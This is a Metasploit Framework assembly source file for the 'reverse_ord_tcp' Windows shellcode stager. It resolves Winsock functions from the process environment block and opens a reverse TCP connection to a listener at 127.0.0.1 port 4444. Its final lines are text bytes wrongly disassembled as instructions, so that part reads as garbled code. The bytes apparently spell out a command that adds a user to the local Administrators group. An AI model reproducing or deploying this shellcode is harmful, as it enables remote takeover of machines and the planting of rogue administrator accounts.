;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for reverse_ord_tcp (stager)
;
; Authors: hdm <hdm@metasploit.com>, vlad902 <vlad902@gmail.com>, spoonm <spoonm@no$email.com>
; Size   : 179
;

cld
xor ebx,ebx
mov eax,[fs:ebx+0x30]
mov eax,[eax+0xc]
mov edx,[eax+0x1c]
mov edx,[edx]
mov esi,[edx+0x20]
lodsd
lodsd
dec esi
add eax,[esi]
cmp eax,0x325f3332
jnz 0xd
mov ebp,[edx+0x8]
mov eax,[ebp+0x3c]
mov ecx,[ebp+eax+0x78]
mov ecx,[ebp+ecx+0x1c]
add ecx,ebp
mov eax,[ecx+0x58]
add eax,ebp
mov esi,[ecx+0x3c]
add esi,ebp
add ebp,[ecx+0xc]
push ebx
push byte +0x1
push byte +0x2
call eax
xchg eax,edi
push dword 0x100007f
push dword 0x5c110002
mov ecx,esp
push ebx
mov bh,0xc
push ebx
push ecx
push edi
push ecx
push byte +0x10
push ecx
push edi
push esi
jmp ebp
arpl [ebp+0x64],bp
gs js 0xc9
and [edi],ch
arpl [eax],sp
outsb
gs jz 0x8c
jnz 0xe1
gs jc 0x91
insd
gs jz 0xd6
jnc 0xe7
insb
outsd
imul esi,[eax+0x20],dword 0x4444412f
and [esi],ah
and [es:esi+0x65],ch
jz 0xa9
insb
outsd
arpl [ecx+0x6c],sp
a16 jc 0x100
jnz 0x103
and [ecx+0x64],al
insd
imul ebp,[esi+0x69],dword 0x61727473
jz 0x10f
jc 0x115
and [ebp+0x65],ch
jz 0x108
jnc 0x119
insb
outsd
imul esi,[eax+0x2f],dword 0x444441
